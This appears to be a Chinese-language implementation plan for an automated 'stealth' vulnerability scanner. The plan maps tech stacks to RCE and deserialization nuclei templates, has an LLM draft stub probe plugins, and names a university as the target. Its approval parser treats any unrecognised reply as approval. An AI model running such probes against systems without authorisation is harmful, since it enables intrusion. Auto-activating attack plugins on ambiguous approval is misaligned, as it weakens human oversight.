# Reflection Phase Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** 在 stealth-scanner 的 brute 阶段结束后自动触发 reflection phase：映射表安装已知技术栈工具（确定性），AI 分析覆盖缺口并生成插件脚本，Feishu 审批超时后降级至 Claude Code AskUserQuestion。

**Architecture:** `reflect.py` 被 `run_scan.py` 以 subprocess 调用，读取 DB 中的 tech_stack / suspicious_points / findings，先跑映射层（无 AI），再喂 mmx 做缺口分析，生成插件写入 `TOOLS/plugins/`，Feishu 有回复则按回复激活，超时则 exit code 2 + stdout [APPROVAL_PENDING] JSON，Claude Code 处理后续审批。已激活插件在下一轮 `probe_runner.py` 中自动追加。

**Tech Stack:** Python 3.11+, SQLite WAL, mmx CLI (MiniMax), lark-cli (Feishu), nuclei, subprocess

---

## File Map

| 动作 | 文件 | 职责 |
|------|------|------|
| 新建 | `migrations/013_plugins_reflect.sql` | plugins 表 + scan_state 两列 |
| 修改 | `TOOLS/db/schema.sql` | 同步 plugins 表定义 |
| 新建 | `TOOLS/pipeline/reflect_map.py` | 静态 tech_stack → 工具映射表 |
| 新建 | `TOOLS/pipeline/reflect.py` | reflection 主脚本 |
| 修改 | `TOOLS/run_scan.py` | 加 reflect phase handler，brute → reflect |
| 修改 | `TOOLS/pipeline/probe_runner.py` | 读 active plugins 追加执行 |
| 新建 | `TOOLS/tests/test_reflect.py` | 单元测试 |

---

## Task 1: Migration 013 — plugins 表 + scan_state 扩展

**Files:**
- Create: `migrations/013_plugins_reflect.sql`
- Modify: `TOOLS/db/schema.sql`

- [ ] **Step 1: 写 migration SQL**

```sql
-- migrations/013_plugins_reflect.sql
CREATE TABLE IF NOT EXISTS plugins (
    id                INTEGER PRIMARY KEY AUTOINCREMENT,
    name              TEXT NOT NULL UNIQUE,
    type              TEXT NOT NULL CHECK(type IN (
                          'nuclei_template','python_script','tool_binary','config'
                      )),
    trigger_stack     TEXT,
    covers_vuln_types TEXT,
    file_path         TEXT,
    install_cmd       TEXT,
    source            TEXT DEFAULT 'mapping'
                          CHECK(source IN ('mapping','ai_generated')),
    active            INTEGER DEFAULT 1,
    created_at        TEXT DEFAULT (datetime('now','localtime')),
    last_used_at      TEXT
);

ALTER TABLE scan_state ADD COLUMN reflect_ran_at TEXT;
ALTER TABLE scan_state ADD COLUMN plugins_added_json TEXT;
```

- [ ] **Step 2: 在 schema.sql 末尾追加 plugins 表定义**

在 `TOOLS/db/schema.sql` 的 `CREATE UNIQUE INDEX IF NOT EXISTS idx_auth_sessions_name_domain` 之后追加：

```sql
CREATE TABLE IF NOT EXISTS plugins (
    id                INTEGER PRIMARY KEY AUTOINCREMENT,
    name              TEXT NOT NULL UNIQUE,
    type              TEXT NOT NULL CHECK(type IN (
                          'nuclei_template','python_script','tool_binary','config'
                      )),
    trigger_stack     TEXT,
    covers_vuln_types TEXT,
    file_path         TEXT,
    install_cmd       TEXT,
    source            TEXT DEFAULT 'mapping'
                          CHECK(source IN ('mapping','ai_generated')),
    active            INTEGER DEFAULT 1,
    created_at        TEXT DEFAULT (datetime('now','localtime')),
    last_used_at      TEXT
);
```

- [ ] **Step 3: 验证 migration 可对现有 DB 执行**

```bash
python TOOLS/db/migrate.py --target "台州学院"
# Expected: 输出包含 "013" applied
```

- [ ] **Step 4: Commit**

```bash
git add migrations/013_plugins_reflect.sql TOOLS/db/schema.sql
git commit -m "feat: migration 013 — plugins table + scan_state reflect columns"
```

---

## Task 2: reflect_map.py — 静态映射表

**Files:**
- Create: `TOOLS/pipeline/reflect_map.py`
- Test: `TOOLS/tests/test_reflect.py`（第一批用例）

- [ ] **Step 1: 写失败测试**

新建 `TOOLS/tests/test_reflect.py`：

```python
import sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from pipeline.reflect_map import get_plugins_for_stacks


def test_spring_boot_returns_actuator():
    plugins = get_plugins_for_stacks(["Spring Boot"])
    names = [p["name"] for p in plugins]
    assert "spring-actuator" in names


def test_unknown_stack_returns_empty():
    plugins = get_plugins_for_stacks(["UnknownFramework"])
    assert plugins == []


def test_multi_stack_deduplicates():
    plugins = get_plugins_for_stacks(["Spring Boot", "Spring Boot"])
    names = [p["name"] for p in plugins]
    assert names.count("spring-actuator") == 1


def test_plugin_has_required_fields():
    plugins = get_plugins_for_stacks(["Shiro"])
    for p in plugins:
        assert "name" in p
        assert "type" in p
        assert "vuln_types" in p
        assert p["type"] in ("nuclei_template", "python_script", "tool_binary", "config")
```

- [ ] **Step 2: 运行测试，确认失败**

```bash
cd "e:/SRC挖掘/SRC"
python -m pytest TOOLS/tests/test_reflect.py -v
# Expected: ERROR — cannot import reflect_map
```

- [ ] **Step 3: 实现 reflect_map.py**

新建 `TOOLS/pipeline/reflect_map.py`：

```python
"""静态 tech_stack → 插件映射表。每项 name 须全局唯一。"""

STACK_PLUGINS: dict[str, list[dict]] = {
    "Spring Boot": [
        {
            "name": "spring-actuator",
            "type": "nuclei_template",
            "vuln_types": ["info_leak", "config_exposure"],
            "install_cmd": "nuclei -update-templates",
            "file_path": None,
        },
        {
            "name": "spring4shell",
            "type": "nuclei_template",
            "vuln_types": ["rce"],
            "install_cmd": "nuclei -update-templates",
            "file_path": None,
        },
    ],
    "Shiro": [
        {
            "name": "shiro-deserialization",
            "type": "nuclei_template",
            "vuln_types": ["rce"],
            "install_cmd": "nuclei -update-templates",
            "file_path": None,
        },
    ],
    "ThinkPHP": [
        {
            "name": "thinkphp-rce",
            "type": "nuclei_template",
            "vuln_types": ["rce"],
            "install_cmd": "nuclei -update-templates",
            "file_path": None,
        },
    ],
    "FastJSON": [
        {
            "name": "fastjson-deserialization",
            "type": "nuclei_template",
            "vuln_types": ["rce"],
            "install_cmd": "nuclei -update-templates",
            "file_path": None,
        },
    ],
    "Struts2": [
        {
            "name": "struts2-rce",
            "type": "nuclei_template",
            "vuln_types": ["rce"],
            "install_cmd": "nuclei -update-templates",
            "file_path": None,
        },
    ],
    "WordPress": [
        {
            "name": "wordpress-vulns",
            "type": "nuclei_template",
            "vuln_types": ["rce", "sqli", "xss"],
            "install_cmd": "nuclei -update-templates",
            "file_path": None,
        },
    ],
    "Discuz": [
        {
            "name": "discuz-vulns",
            "type": "nuclei_template",
            "vuln_types": ["rce", "sqli"],
            "install_cmd": "nuclei -update-templates",
            "file_path": None,
        },
    ],
    "JWT": [
        {
            "name": "jwt-none-alg",
            "type": "python_script",
            "vuln_types": ["auth_bypass"],
            "install_cmd": None,
            "file_path": "TOOLS/plugins/scripts/jwt_none_alg.py",
        },
    ],
    "Laravel": [
        {
            "name": "laravel-debug",
            "type": "nuclei_template",
            "vuln_types": ["info_leak", "rce"],
            "install_cmd": "nuclei -update-templates",
            "file_path": None,
        },
    ],
}


def get_plugins_for_stacks(stacks: list[str]) -> list[dict]:
    """返回给定技术栈对应的插件列表，去重（按 name）。"""
    seen: set[str] = set()
    result: list[dict] = []
    for stack in stacks:
        for plugin in STACK_PLUGINS.get(stack, []):
            if plugin["name"] not in seen:
                seen.add(plugin["name"])
                result.append({**plugin, "trigger_stack": stack})
    return result
```

- [ ] **Step 4: 运行测试，确认通过**

```bash
python -m pytest TOOLS/tests/test_reflect.py -v
# Expected: 4 passed
```

- [ ] **Step 5: Commit**

```bash
git add TOOLS/pipeline/reflect_map.py TOOLS/tests/test_reflect.py
git commit -m "feat: reflect_map — static tech_stack plugin mapping"
```

---

## Task 3: reflect.py — 数据读取 + 映射层安装

**Files:**
- Create: `TOOLS/pipeline/reflect.py`（第一阶段：映射层）
- Modify: `TOOLS/tests/test_reflect.py`（追加用例）

- [ ] **Step 1: 追加测试**

在 `TOOLS/tests/test_reflect.py` 末尾追加：

```python
import sqlite3
import tempfile
import os


def _make_test_db() -> tuple[str, sqlite3.Connection]:
    """创建最小测试 DB（含 targets + plugins + scan_state 表）。"""
    fd, path = tempfile.mkstemp(suffix=".db")
    os.close(fd)
    conn = sqlite3.connect(path)
    conn.executescript("""
        CREATE TABLE targets (id INTEGER PRIMARY KEY, target_name TEXT, tech_stack TEXT);
        CREATE TABLE plugins (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            name TEXT NOT NULL UNIQUE,
            type TEXT NOT NULL,
            trigger_stack TEXT,
            covers_vuln_types TEXT,
            file_path TEXT,
            install_cmd TEXT,
            source TEXT DEFAULT 'mapping',
            active INTEGER DEFAULT 1,
            created_at TEXT,
            last_used_at TEXT
        );
        CREATE TABLE scan_state (
            id INTEGER PRIMARY KEY,
            reflect_ran_at TEXT,
            plugins_added_json TEXT
        );
        INSERT INTO targets VALUES (1, 'test', '["Spring Boot","JWT"]');
        INSERT INTO scan_state VALUES (1, NULL, NULL);
    """)
    conn.commit()
    return path, conn


def test_read_tech_stacks():
    from pipeline.reflect import read_tech_stacks
    path, conn = _make_test_db()
    stacks = read_tech_stacks(conn)
    assert "Spring Boot" in stacks
    assert "JWT" in stacks
    conn.close()
    os.unlink(path)


def test_get_missing_mapped_plugins():
    from pipeline.reflect import get_missing_mapped_plugins
    path, conn = _make_test_db()
    # spring-actuator 已安装
    conn.execute("INSERT INTO plugins (name, type, source) VALUES ('spring-actuator','nuclei_template','mapping')")
    conn.commit()
    missing = get_missing_mapped_plugins(conn, ["Spring Boot"])
    names = [p["name"] for p in missing]
    assert "spring-actuator" not in names  # 已安装
    assert "spring4shell" in names          # 未安装
    conn.close()
    os.unlink(path)
```

- [ ] **Step 2: 运行测试，确认失败**

```bash
python -m pytest TOOLS/tests/test_reflect.py::test_read_tech_stacks -v
# Expected: ERROR — cannot import reflect
```

- [ ] **Step 3: 实现 reflect.py 骨架 + 两个纯函数**

新建 `TOOLS/pipeline/reflect.py`：

```python
"""Reflection phase：分析技术栈覆盖缺口，安装映射工具，AI 生成补充插件。

用法:
  python TOOLS/pipeline/reflect.py --target "台州学院"
  python TOOLS/pipeline/reflect.py --target "台州学院" --force
  python TOOLS/pipeline/reflect.py --target "台州学院" --feishu-timeout 30

退出码:
  0  正常完成（含零缺口情况）
  2  AI 生成插件等待飞书审批超时 → Claude Code 接管
  1  致命错误
"""

import argparse
import json
import os
import sqlite3
import subprocess
import sys
from datetime import datetime
from pathlib import Path

PROJECT_ROOT = Path(__file__).resolve().parent.parent.parent
TOOLS_DIR = Path(__file__).resolve().parent.parent
PLUGINS_DIR = PROJECT_ROOT / "TOOLS" / "plugins"
PLUGINS_NUCLEI_DIR = PLUGINS_DIR / "nuclei"
PLUGINS_SCRIPTS_DIR = PLUGINS_DIR / "scripts"
PLUGINS_CONFIGS_DIR = PLUGINS_DIR / "configs"

sys.path.insert(0, str(TOOLS_DIR))
from db.db_utils import connect, find_db  # noqa: E402
from pipeline.reflect_map import get_plugins_for_stacks  # noqa: E402


# ── Pure functions (testable) ─────────────────────────────────────────────────


def read_tech_stacks(conn: sqlite3.Connection) -> list[str]:
    """从 targets 表读取所有技术栈名称，去重。"""
    rows = conn.execute("SELECT tech_stack FROM targets WHERE tech_stack IS NOT NULL").fetchall()
    stacks: set[str] = set()
    for row in rows:
        raw = row[0]
        if not raw:
            continue
        try:
            items = json.loads(raw)
            if isinstance(items, list):
                stacks.update(str(i) for i in items)
            else:
                stacks.add(str(raw))
        except json.JSONDecodeError:
            # 逗号分隔字符串兜底
            for part in raw.split(","):
                p = part.strip()
                if p:
                    stacks.add(p)
    return sorted(stacks)


def get_missing_mapped_plugins(conn: sqlite3.Connection, stacks: list[str]) -> list[dict]:
    """返回映射表中尚未安装（plugins 表无记录）的插件。"""
    installed = {
        row[0]
        for row in conn.execute("SELECT name FROM plugins WHERE source='mapping'").fetchall()
    }
    return [p for p in get_plugins_for_stacks(stacks) if p["name"] not in installed]
```

- [ ] **Step 4: 运行测试，确认通过**

```bash
python -m pytest TOOLS/tests/test_reflect.py::test_read_tech_stacks TOOLS/tests/test_reflect.py::test_get_missing_mapped_plugins -v
# Expected: 2 passed
```

- [ ] **Step 5: Commit**

```bash
git add TOOLS/pipeline/reflect.py TOOLS/tests/test_reflect.py
git commit -m "feat: reflect.py skeleton — read_tech_stacks + get_missing_mapped_plugins"
```

---

## Task 4: reflect.py — 映射工具安装 + AI 缺口分析

**Files:**
- Modify: `TOOLS/pipeline/reflect.py`
- Modify: `TOOLS/tests/test_reflect.py`

- [ ] **Step 1: 追加测试（AI 缺口分析输入构建）**

在 `TOOLS/tests/test_reflect.py` 末尾追加：

```python
def test_build_analysis_context():
    from pipeline.reflect import build_analysis_context
    path, conn = _make_test_db()
    conn.executescript("""
        CREATE TABLE suspicious_points (
            id TEXT PRIMARY KEY, test_type TEXT, test_status TEXT
        );
        CREATE TABLE findings (id TEXT PRIMARY KEY, type TEXT);
        INSERT INTO suspicious_points VALUES ('SP-1','auth_surface','untested');
        INSERT INTO suspicious_points VALUES ('SP-2','sqli','untested');
        INSERT INTO findings VALUES ('F-1','info_leak');
    """)
    conn.commit()
    ctx = build_analysis_context(conn, ["Spring Boot", "JWT"], ["spring-actuator"])
    assert "Spring Boot" in ctx["tech_stacks"]
    assert "auth_surface" in ctx["sp_coverage"]
    assert "info_leak" in ctx["confirmed_types"]
    assert "spring-actuator" in ctx["installed_plugins"]
    conn.close()
    os.unlink(path)
```

- [ ] **Step 2: 运行测试，确认失败**

```bash
python -m pytest TOOLS/tests/test_reflect.py::test_build_analysis_context -v
# Expected: ERROR — cannot import build_analysis_context
```

- [ ] **Step 3: 实现安装映射工具 + build_analysis_context**

在 `TOOLS/pipeline/reflect.py` 的 pure functions 区追加：

```python
def build_analysis_context(
    conn: sqlite3.Connection,
    stacks: list[str],
    installed_plugin_names: list[str],
) -> dict:
    """构建喂给 mmx 的分析上下文。"""
    # SP 覆盖分布
    rows = conn.execute(
        "SELECT test_type, COUNT(*) as cnt FROM suspicious_points GROUP BY test_type"
    ).fetchall()
    sp_coverage = {r[0]: r[1] for r in rows}

    # findings 已确认类型
    rows2 = conn.execute("SELECT DISTINCT type FROM findings").fetchall()
    confirmed_types = [r[0] for r in rows2]

    return {
        "tech_stacks": stacks,
        "sp_coverage": sp_coverage,
        "confirmed_types": confirmed_types,
        "installed_plugins": installed_plugin_names,
    }
```

并在文件末尾追加安装映射工具的函数：

```python
def install_mapped_plugins(
    conn: sqlite3.Connection,
    missing: list[dict],
    dry_run: bool = False,
) -> list[str]:
    """安装缺失的映射工具，写入 plugins 表 active=1，返回安装成功的 name 列表。"""
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    installed: list[str] = []
    for plugin in missing:
        cmd = plugin.get("install_cmd")
        if cmd and not dry_run:
            print(f"[reflect] 安装 {plugin['name']}: {cmd}")
            result = subprocess.run(  # noqa: S603
                cmd.split(), capture_output=True, text=True, timeout=120, check=False
            )
            if result.returncode != 0:
                print(f"[reflect] 安装失败 {plugin['name']}: {result.stderr[:200]}", file=sys.stderr)
                continue
        conn.execute(
            """INSERT INTO plugins
               (name, type, trigger_stack, covers_vuln_types, file_path, install_cmd, source, active, created_at)
               VALUES (?, ?, ?, ?, ?, ?, 'mapping', 1, ?)
               ON CONFLICT(name) DO NOTHING""",
            (
                plugin["name"],
                plugin["type"],
                plugin.get("trigger_stack", ""),
                json.dumps(plugin.get("vuln_types", [])),
                plugin.get("file_path"),
                cmd,
                now,
            ),
        )
        conn.commit()
        installed.append(plugin["name"])
    return installed
```

- [ ] **Step 4: 运行测试**

```bash
python -m pytest TOOLS/tests/test_reflect.py::test_build_analysis_context -v
# Expected: 1 passed
```

- [ ] **Step 5: Commit**

```bash
git add TOOLS/pipeline/reflect.py TOOLS/tests/test_reflect.py
git commit -m "feat: reflect — install_mapped_plugins + build_analysis_context"
```

---

## Task 5: reflect.py — AI 缺口分析 + 插件生成

**Files:**
- Modify: `TOOLS/pipeline/reflect.py`

- [ ] **Step 1: 实现 call_mmx_gap_analysis**

在 `TOOLS/pipeline/reflect.py` 追加：

```python
def call_mmx_gap_analysis(ctx: dict) -> list[dict]:
    """用 mmx 分析覆盖缺口，返回 gap 列表。失败返回 []。

    每个 gap: {"gap": str, "vuln_types": list[str], "suggest": str, "priority": "High|Medium|Low"}
    """
    prompt = (
        "你是 SRC 渗透测试助手，分析以下扫描数据，找出尚未覆盖的漏洞类型。\n"
        "只输出 JSON 数组，无 markdown 围栏。每项字段:\n"
        '{"gap":"描述","vuln_types":["rce"],"suggest":"nuclei_template|python_script","priority":"High|Medium|Low"}\n'
        "规则: 仅输出 High/Medium 缺口（Low 不输出）; 已安装插件覆盖的类型不重复; 最多 5 条;\n"
        "扫描数据:\n"
        + json.dumps(ctx, ensure_ascii=False, indent=2)
    )
    tmp_path = PROJECT_ROOT / "tmp" / f"reflect_gap_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    tmp_path.parent.mkdir(exist_ok=True)
    tmp_path.write_text(prompt, encoding="utf-8")
    prompt_content = tmp_path.read_text(encoding="utf-8")  # Windows: 直接传字符串，不用 $(cat ...)
    tmp_path.unlink(missing_ok=True)

    result = subprocess.run(  # noqa: S603
        ["mmx", "text", "chat", "--message", prompt_content,
         "--output", "text", "--non-interactive"],
        capture_output=True, text=True, timeout=60, check=False,
    )

    raw = result.stdout.strip()
    # 提取第一个 [...] 块
    import re
    m = re.search(r"\[.*\]", raw, re.DOTALL)
    if not m:
        print(f"[reflect] mmx 返回无法解析: {raw[:200]}", file=sys.stderr)
        return []
    try:
        gaps = json.loads(m.group())
        return [g for g in gaps if isinstance(g, dict) and g.get("priority") in ("High", "Medium")]
    except json.JSONDecodeError as e:
        print(f"[reflect] gap JSON 解析失败: {e}", file=sys.stderr)
        return []
```

- [ ] **Step 2: 实现插件文件生成**

```python
def generate_plugin_files(gaps: list[dict]) -> list[dict]:
    """为每个 gap 生成插件文件，返回含 file_path 的 plugin dict 列表。"""
    PLUGINS_NUCLEI_DIR.mkdir(parents=True, exist_ok=True)
    PLUGINS_SCRIPTS_DIR.mkdir(parents=True, exist_ok=True)

    plugins: list[dict] = []
    for gap in gaps:
        suggest = gap.get("suggest", "python_script")
        name = _gap_to_name(gap["gap"])
        vuln_types = gap.get("vuln_types", [])

        if suggest == "nuclei_template":
            file_path = PLUGINS_NUCLEI_DIR / f"{name}.yaml"
            content = _generate_nuclei_yaml(name, gap["gap"], vuln_types)
            file_path.write_text(content, encoding="utf-8")
            rel_path = f"TOOLS/plugins/nuclei/{name}.yaml"
        else:
            file_path = PLUGINS_SCRIPTS_DIR / f"{name}.py"
            content = _generate_python_script(name, gap["gap"], vuln_types)
            file_path.write_text(content, encoding="utf-8")
            rel_path = f"TOOLS/plugins/scripts/{name}.py"

        plugins.append({
            "name": name,
            "type": suggest,
            "trigger_stack": "",
            "covers_vuln_types": json.dumps(vuln_types),
            "file_path": rel_path,
            "install_cmd": None,
            "source": "ai_generated",
            "gap_desc": gap["gap"],
            "priority": gap.get("priority", "Medium"),
        })
    return plugins


def _gap_to_name(gap: str) -> str:
    """将缺口描述转为 slug（小写字母数字-）。"""
    import re
    slug = re.sub(r"[^\w\s-]", "", gap.lower())
    slug = re.sub(r"[\s_]+", "-", slug)
    return slug[:40].strip("-")


def _generate_nuclei_yaml(name: str, description: str, vuln_types: list[str]) -> str:
    tags = ",".join(vuln_types) if vuln_types else "custom"
    return f"""id: {name}
info:
  name: {description}
  severity: medium
  tags: {tags},ai-generated

requests:
  - method: GET
    path:
      - "{{{{BaseURL}}}}"
    matchers:
      - type: status
        status:
          - 200
"""


def _generate_python_script(name: str, description: str, vuln_types: list[str]) -> str:
    return f'''"""AI 生成插件: {description}

用法（probe_runner.py 调用）:
  python {name}.py --target "目标名" --db "/path/to/db"
"""
import argparse
import sqlite3
import sys


def run(target: str, db_path: str) -> int:
    """执行探测逻辑，返回写入的 suspicious_points 数量。"""
    # TODO: 在此实现针对 {", ".join(vuln_types)} 的探测逻辑
    print(f"[{name}] 插件已加载，awaiting implementation for: {description}")
    return 0


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", required=True)
    parser.add_argument("--db", required=True)
    args = parser.parse_args()
    sys.exit(run(args.target, args.db))


if __name__ == "__main__":
    main()
'''
```

- [ ] **Step 3: 写入 plugins 表（active=0，等待审批）**

```python
def stage_ai_plugins(conn: sqlite3.Connection, plugins: list[dict]) -> list[dict]:
    """将 AI 生成的插件写入 plugins 表 active=0，返回实际写入的列表（排除重名）。"""
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    staged: list[dict] = []
    for p in plugins:
        cur = conn.execute(
            """INSERT INTO plugins
               (name, type, trigger_stack, covers_vuln_types, file_path, install_cmd,
                source, active, created_at)
               VALUES (?, ?, ?, ?, ?, NULL, 'ai_generated', 0, ?)
               ON CONFLICT(name) DO NOTHING""",
            (p["name"], p["type"], p["trigger_stack"],
             p["covers_vuln_types"], p["file_path"], now),
        )
        if cur.rowcount:
            staged.append(p)
    conn.commit()
    return staged
```

- [ ] **Step 4: Commit**

```bash
git add TOOLS/pipeline/reflect.py
git commit -m "feat: reflect — AI gap analysis + plugin file generation"
```

---

## Task 6: reflect.py — Feishu 审批 + [APPROVAL_PENDING] 降级

**Files:**
- Modify: `TOOLS/pipeline/reflect.py`
- Modify: `TOOLS/tests/test_reflect.py`

- [ ] **Step 1: 追加审批流测试**

```python
def test_parse_feishu_reply_ok():
    from pipeline.reflect import parse_feishu_reply
    ids = [1, 2, 3]
    assert parse_feishu_reply("ok", ids) == [1, 2, 3]


def test_parse_feishu_reply_skip():
    from pipeline.reflect import parse_feishu_reply
    ids = [1, 2, 3]
    assert parse_feishu_reply("skip 2", ids) == [1, 3]


def test_parse_feishu_reply_no():
    from pipeline.reflect import parse_feishu_reply
    ids = [1, 2, 3]
    assert parse_feishu_reply("no", ids) == []


def test_parse_feishu_reply_unknown_defaults_to_ok():
    from pipeline.reflect import parse_feishu_reply
    ids = [1, 2]
    assert parse_feishu_reply("随便什么", ids) == [1, 2]
```

- [ ] **Step 2: 运行测试，确认失败**

```bash
python -m pytest TOOLS/tests/test_reflect.py::test_parse_feishu_reply_ok -v
# Expected: ERROR
```

- [ ] **Step 3: 实现 parse_feishu_reply + 审批流**

```python
def parse_feishu_reply(reply: str, plugin_ids: list[int]) -> list[int]:
    """解析飞书回复，返回需要激活的 plugin id 列表。"""
    r = reply.strip().lower()
    if r == "no":
        return []
    if r.startswith("skip"):
        import re
        skip_nums = set(int(x) for x in re.findall(r"\d+", r))
        return [pid for i, pid in enumerate(plugin_ids, 1) if i not in skip_nums]
    return list(plugin_ids)  # "ok" 或其他任何回复 → 全部激活


def request_approval_feishu(
    staged: list[dict],
    plugin_ids: list[int],
    target: str,
    timeout_minutes: int,
) -> list[int] | None:
    """发飞书消息等待审批。返回待激活 id 列表，超时返回 None。"""
    chat_id = os.environ.get("FEISHU_CHAT_ID", "")
    if not chat_id:
        return None

    lines = [f"[reflection] {target} 发现 {len(staged)} 个覆盖缺口，已生成插件草稿：\n"]
    for i, p in enumerate(staged, 1):
        lines.append(f"[{i}] {p['name']} ({p['priority']}) — {p['gap_desc']}")
    lines.append(f"\n回复 \"ok\" 全部激活 | \"skip 2\" 跳过第2条 | \"no\" 全部丢弃")
    lines.append(f"（{timeout_minutes}分钟无回复 → Claude Code 审批）")

    sys.path.insert(0, str(TOOLS_DIR))
    from auth.feishu_notify import send_text_wait_reply  # noqa: PLC0415

    reply = send_text_wait_reply(chat_id, "\n".join(lines), timeout=timeout_minutes * 60)
    if reply is None:
        return None  # 超时
    return parse_feishu_reply(reply, plugin_ids)


def activate_plugins(conn: sqlite3.Connection, ids_to_activate: list[int]) -> None:
    """将指定 id 的插件置为 active=1。"""
    if not ids_to_activate:
        return
    placeholders = ",".join("?" * len(ids_to_activate))
    conn.execute(f"UPDATE plugins SET active=1 WHERE id IN ({placeholders})", ids_to_activate)
    conn.commit()
```

- [ ] **Step 4: 运行审批流测试**

```bash
python -m pytest TOOLS/tests/test_reflect.py -k "feishu_reply" -v
# Expected: 4 passed
```

- [ ] **Step 5: Commit**

```bash
git add TOOLS/pipeline/reflect.py TOOLS/tests/test_reflect.py
git commit -m "feat: reflect — Feishu approval flow + APPROVAL_PENDING fallback"
```

---

## Task 7: reflect.py — main() 串联 + [APPROVAL_PENDING] 输出

**Files:**
- Modify: `TOOLS/pipeline/reflect.py`

- [ ] **Step 1: 实现 main()**

在 `TOOLS/pipeline/reflect.py` 末尾追加：

```python
def main() -> None:
    parser = argparse.ArgumentParser(description="Reflection phase")
    parser.add_argument("--target", required=True)
    parser.add_argument("--force", action="store_true", help="忽略上次 reflect_ran_at，强制重跑")
    parser.add_argument("--feishu-timeout", type=int, default=10, dest="feishu_timeout")
    args = parser.parse_args()

    db_path = find_db(args.target)
    conn = connect(db_path)

    # 防重跑：同一 DB 24h 内已跑过则跳过（--force 绕过）
    if not args.force:
        row = conn.execute("SELECT reflect_ran_at FROM scan_state WHERE id=1").fetchone()
        if row and row[0]:
            from datetime import timedelta
            last = datetime.strptime(row[0], "%Y-%m-%d %H:%M:%S")
            if datetime.now() - last < timedelta(hours=24):
                print(f"[reflect] 24h 内已跑过（{row[0]}），跳过。用 --force 强制重跑。")
                conn.close()
                sys.exit(0)

    # ── 层一：映射工具安装 ───────────────────────────────────────────────────
    stacks = read_tech_stacks(conn)
    print(f"[reflect] 检测到技术栈: {stacks}")

    missing = get_missing_mapped_plugins(conn, stacks)
    if missing:
        print(f"[reflect] 安装 {len(missing)} 个映射工具...")
        installed_now = install_mapped_plugins(conn, missing)
        print(f"[reflect] 映射工具安装完成: {installed_now}")

    # ── 层二：AI 缺口分析 ────────────────────────────────────────────────────
    installed_names = [
        r[0] for r in conn.execute("SELECT name FROM plugins WHERE source='mapping'").fetchall()
    ]
    ctx = build_analysis_context(conn, stacks, installed_names)
    gaps = call_mmx_gap_analysis(ctx)
    print(f"[reflect] AI 发现 {len(gaps)} 个缺口")

    if not gaps:
        _finish(conn, args.target, [])
        conn.close()
        sys.exit(0)

    # ── 插件生成 + staged ────────────────────────────────────────────────────
    plugin_dicts = generate_plugin_files(gaps)
    staged = stage_ai_plugins(conn, plugin_dicts)
    if not staged:
        print("[reflect] 无新插件（已全部存在）")
        _finish(conn, args.target, [])
        conn.close()
        sys.exit(0)

    staged_ids = [
        conn.execute("SELECT id FROM plugins WHERE name=?", (p["name"],)).fetchone()[0]
        for p in staged
    ]

    # ── 审批 ─────────────────────────────────────────────────────────────────
    approved_ids = request_approval_feishu(staged, staged_ids, args.target, args.feishu_timeout)

    if approved_ids is None:
        # 超时 → Claude Code 接管
        pending_payload = json.dumps(
            [{"id": pid, "name": p["name"], "priority": p["priority"], "gap": p["gap_desc"]}
             for pid, p in zip(staged_ids, staged)],
            ensure_ascii=False,
        )
        print(f"[APPROVAL_PENDING] {pending_payload}")
        conn.close()
        sys.exit(2)

    activate_plugins(conn, approved_ids)
    _finish(conn, args.target, [p["name"] for p in staged])
    conn.close()
    sys.exit(0)


def _finish(conn: sqlite3.Connection, target: str, added_names: list[str]) -> None:
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    conn.execute(
        "UPDATE scan_state SET reflect_ran_at=?, plugins_added_json=? WHERE id=1",
        (now, json.dumps(added_names)),
    )
    conn.commit()
    print(f"[reflect] 完成: 新增插件={added_names}  ran_at={now}")


if __name__ == "__main__":
    main()
```

- [ ] **Step 2: 语法检查**

```bash
python -m py_compile TOOLS/pipeline/reflect.py && echo "OK"
# Expected: OK
```

- [ ] **Step 3: Commit**

```bash
git add TOOLS/pipeline/reflect.py
git commit -m "feat: reflect.py main() — full pipeline with APPROVAL_PENDING fallback"
```

---

## Task 8: run_scan.py — reflect phase 集成

**Files:**
- Modify: `TOOLS/run_scan.py`

- [ ] **Step 1: 在 handle_brute 末尾将 set_phase 从 spider 改为 reflect**

找到 `run_scan.py` 中：
```python
    set_phase(conn, "spider")
    print_tag("PHASE_TRANSITION", ["brute → spider    目录爆破完成"])
```
改为：
```python
    set_phase(conn, "reflect")
    print_tag("PHASE_TRANSITION", ["brute → reflect    目录爆破完成，进入反思阶段"])
```

- [ ] **Step 2: 新增 handle_reflect()**

在 `handle_brute` 函数之后插入：

```python
def handle_reflect(target: str, db_path: Path, conn: sqlite3.Connection) -> None:
    feishu_timeout = int(os.environ.get("REFLECT_FEISHU_TIMEOUT", "10"))
    print(f"[run_scan] phase=reflect → 运行 reflect.py (feishu_timeout={feishu_timeout}m)...")

    result = subprocess.run(  # noqa: S603
        [
            PYTHON,
            str(PIPELINE_DIR / "reflect.py"),
            "--target", target,
            "--feishu-timeout", str(feishu_timeout),
        ],
        timeout=feishu_timeout * 60 + 120,  # 飞书超时 + 2min buffer
        check=False,
    )

    if result.returncode == 2:
        # reflect.py 已打印 [APPROVAL_PENDING] JSON，Claude Code 接管审批
        # phase 保持 reflect，待审批完成后由操作员或 Claude 推进至 done
        print("[run_scan] reflect → 等待 Claude Code 审批插件")
        return

    set_phase(conn, "done")
    print_tag("PHASE_TRANSITION", ["reflect → done    reflection 完成"])
```

- [ ] **Step 3: 将 "reflect" 加入 HANDLERS 字典**

找到：
```python
HANDLERS = {
    "init": handle_init,
    "spider": handle_spider,
    "probe": handle_probe,
    "brute": handle_brute,
    "auth_ready": handle_auth_ready,
    "auth_explore": handle_auth_explore,
}
```
改为：
```python
HANDLERS = {
    "init": handle_init,
    "spider": handle_spider,
    "probe": handle_probe,
    "brute": handle_brute,
    "reflect": handle_reflect,
    "auth_ready": handle_auth_ready,
    "auth_explore": handle_auth_explore,
}
```

- [ ] **Step 4: 语法检查**

```bash
python -m py_compile TOOLS/run_scan.py && echo "OK"
# Expected: OK
```

- [ ] **Step 5: Commit**

```bash
git add TOOLS/run_scan.py
